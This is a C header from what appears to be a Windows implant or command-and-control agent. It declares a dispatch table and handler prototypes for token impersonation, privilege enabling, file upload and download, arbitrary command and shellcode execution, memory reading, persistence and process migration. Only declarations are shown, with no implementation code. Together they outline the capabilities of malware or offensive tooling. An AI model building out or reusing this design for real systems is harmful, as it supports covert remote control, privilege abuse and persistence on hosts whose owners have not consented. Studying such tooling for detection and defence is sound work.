#pragma once

/*
 * command.h - Command dispatch table and handler prototypes.
 *
 * This header intentionally does NOT include exports.h.  The dependency runs
 * the other way: exports.h includes command.h so that callers of the exported
 * API also get the command table types.  Including exports.h here would create
 * a circular dependency that causes #pragma once to fire mid-processing and
 * silently drop declarations.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>

#include "debug.h"
#include "error.h"
#include "generated_commands.h"
#include "process.h"
#include "security.h"
#include "system.h"

typedef DWORD (*CommandFunction)(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

typedef struct _COMMAND_MAP
{
	CMD_ID id;
	CommandFunction handler;
} COMMAND_MAP;

extern CONST COMMAND_MAP G_CommandTable[];

/* ------------------------------------------------------------------
 * Existing token / system commands
 * ------------------------------------------------------------------ */

DWORD CmdInspectToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdImpersonateToken(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdEnablePrivilege(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdDisablePrivilege(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdHostname(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdWhoami(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * Filesystem
 * ------------------------------------------------------------------ */

DWORD CmdLs(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdCat(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdMkdir(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdRm(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdUpload(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdDownload(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * System enumeration
 * ------------------------------------------------------------------ */

DWORD CmdPs(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdGetpid(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * Execution
 * ------------------------------------------------------------------ */

DWORD CmdExec(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdShellcodeexec(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * Memory / object inspection
 * ------------------------------------------------------------------ */

DWORD CmdMemread(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdModulelist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdHandlelist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * Environment
 * ------------------------------------------------------------------ */

DWORD CmdEnv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdGetenv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdSetenv(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * Implant management
 * ------------------------------------------------------------------ */

DWORD CmdSleep(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdKill(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdPersist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdUnpersist(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);
DWORD CmdMigrate(DWORD dataLen, CONST PBYTE data, PBYTE* responseData, DWORD* responseLen);

/* ------------------------------------------------------------------
 * Dispatch
 * ------------------------------------------------------------------ */

DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);
